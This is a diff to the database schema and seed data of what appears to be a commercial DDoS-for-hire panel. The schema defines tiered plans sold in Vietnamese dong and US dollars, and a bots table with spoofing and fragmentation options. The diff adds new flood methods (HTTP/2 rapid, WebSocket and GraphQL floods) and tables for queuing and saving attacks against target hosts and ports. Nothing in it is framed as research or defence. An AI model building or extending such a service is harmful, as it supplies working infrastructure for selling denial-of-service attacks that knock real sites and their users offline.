@@ -28,7 +28,7 @@ CREATE TABLE plans (
     max_attack_secs     INT NOT NULL DEFAULT 120,
     cooldown_secs       INT NOT NULL DEFAULT 300,
     max_pps_per_bot     INT NOT NULL DEFAULT 500000,
-    allowed_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,UDP}',
+    allowed_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,H2RAPID,WSFLOOD,GRAPHQL,UDP}',
     price_vnd           INT NOT NULL DEFAULT 10000,
     price_usd           DECIMAL(10,2) NOT NULL DEFAULT 0.50,
     is_active           BOOLEAN DEFAULT TRUE,
@@ -81,7 +81,7 @@ CREATE TABLE bots (
     max_pps             INT DEFAULT 50000000,
     max_mbps            INT DEFAULT 1000,
     max_threads         INT DEFAULT 10000,
-    enabled_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,UDP}',
+    enabled_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,H2RAPID,WSFLOOD,GRAPHQL,UDP}',
     spoof_mode          INT DEFAULT 0,
     fragmentation       BOOLEAN DEFAULT FALSE,
     last_heartbeat_at   TIMESTAMPTZ,
@@ -163,6 +163,7 @@ CREATE TABLE site_settings (
     bank_bin                VARCHAR(16) DEFAULT '970422',
     min_deposit             INT DEFAULT 10000,
     maintenance_mode        BOOLEAN DEFAULT FALSE,
+    discord_webhook_url     VARCHAR(255) DEFAULT '',
     updated_at              TIMESTAMPTZ DEFAULT NOW()
 );
 
@@ -178,6 +179,37 @@ CREATE TABLE mb_sessions (
     extra       JSONB DEFAULT '{}'
 );
 
+-- ── Attack Templates (user presets) ───────────
+CREATE TABLE attack_templates (
+    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
+    name            VARCHAR(64) NOT NULL,
+    target_host     VARCHAR(255) NOT NULL,
+    target_port     INT NOT NULL DEFAULT 80,
+    method          VARCHAR(16) NOT NULL DEFAULT 'MEGA',
+    duration_secs   INT DEFAULT 60,
+    bot_count       INT DEFAULT 1,
+    created_at      TIMESTAMPTZ DEFAULT NOW()
+);
+
+-- ── Attack Queue (waiting for bots) ───────────
+CREATE TABLE attack_queue (
+    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
+    target_host     VARCHAR(255) NOT NULL,
+    target_port     INT NOT NULL,
+    method          VARCHAR(16) NOT NULL,
+    duration_secs   INT NOT NULL,
+    pps_per_bot     INT DEFAULT 100000,
+    bot_count       INT DEFAULT 1,
+    status          VARCHAR(16) DEFAULT 'queued',
+    task_id         UUID REFERENCES attack_tasks(id) ON DELETE SET NULL,
+    created_at      TIMESTAMPTZ DEFAULT NOW(),
+    started_at      TIMESTAMPTZ
+);
+
+CREATE INDEX idx_queue_status ON attack_queue(status);
+
 -- ============================================================
 -- SEED DATA
 -- ============================================================
@@ -192,7 +224,7 @@ INSERT INTO site_settings (id) VALUES (1) ON CONFLICT DO NOTHING;
 
 -- Plans (updated methods, durations, pricing)
 INSERT INTO plans (name, slug, description, max_bots, max_concurrent, max_attack_secs, cooldown_secs, max_pps_per_bot, allowed_methods, price_vnd, price_usd) VALUES
-('Starter',    'starter',    '1 bot, 120s, cơ bản',           1,  1,  120, 300,  100000,  '{MEGA,TLS_EXHAUST,SLOWLORIS}',                              10000,  0.50),
-('Pro',        'pro',        '5 bot, 300s, đầy đủ method',     5,  3,  300, 120,  500000,  '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME}',         50000,  5.00),
-('Enterprise', 'enterprise', '20 bot, 600s, toàn bộ method',  20, 10, 600,  30, 2000000, '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,UDP}',     200000, 20.00)
+('Starter',    'starter',    '1 bot, 120s, cơ bản',           1,  1,  120, 300,  100000,  '{MEGA,TLS_EXHAUST,SLOWLORIS}',                                                    10000,  0.50),
+('Pro',        'pro',        '5 bot, 300s, đầy đủ method',     5,  3,  300, 120,  500000,  '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME}',                               50000,  5.00),
+('Enterprise', 'enterprise', '20 bot, 600s, toàn bộ method',  20, 10, 600,  30, 2000000, '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,H2RAPID,WSFLOOD,GRAPHQL,UDP}',  200000, 20.00)
 ON CONFLICT DO NOTHING;
